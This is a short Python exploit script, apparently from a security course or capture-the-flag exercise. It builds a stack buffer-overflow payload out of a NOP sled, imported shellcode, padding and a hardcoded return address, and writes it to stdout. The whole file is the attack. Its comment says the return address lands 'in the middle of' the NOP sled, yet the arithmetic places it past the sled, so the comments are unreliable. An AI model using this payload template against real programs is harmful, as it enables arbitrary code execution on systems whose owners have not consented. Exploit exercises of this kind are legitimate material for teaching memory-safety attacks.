#!/usr/bin/env python3

import sys
from shellcode import shellcode

# Constants
buffer_size = 1024       # Total buffer size
nop_sled_size = 256      # Size of the NOP sled
padding_size = buffer_size - nop_sled_size - len(shellcode)  # Remaining space
start_of_buffer = 0x7ffffff6d000  # Approximate starting address of the buffer
return_address = start_of_buffer + 512  # Point to middle of the buffer (into the NOP sled)

# Construct the payload
payload = (
    b"\x90" * nop_sled_size +                 # NOP sled
    shellcode +                               # Shellcode
    b"A" * padding_size +                     # Padding to fill the buffer
    return_address.to_bytes(8, 'little')      # Overwrite return address
)

# Write the payload to stdout
sys.stdout.buffer.write(payload)
